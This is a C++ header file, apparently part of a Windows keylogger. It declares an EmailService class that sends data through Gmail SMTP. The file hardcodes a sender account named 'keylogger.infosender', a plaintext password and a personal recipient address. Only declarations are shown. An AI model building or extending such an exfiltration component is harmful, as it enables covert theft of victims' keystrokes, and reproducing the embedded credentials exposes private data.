#pragma once

#include "CSmtp.h"

#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif // !_WINSOCKAPI_
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif // !WIN32_LEAN_AND_MEAN

#include <stdio.h>
#include <winuser.h>
#include <windows.h>
#include <windowsx.h>
#include <string>
#include "StringUtilities.h"

#define GMAIL_SERVER "smtp.gmail.com"
#define GMAIL_PORT 465
#define EMAIL_LOGIN "keylogger.infosender@gmail.com"
#define EMAIL_PASSWORD "_keylogger_"
#define DEFAULT_EMAIL_TO L"vlad.klimenkoff97@gmail.com"

class EmailService {
public:
	EmailService();
	bool sendEmail(std::wstring subject, std::wstring body, std::wstring emailTo);
private:
	int mailIt(const char* emailto, const char* emailsubject, const char* emailmessage);
};

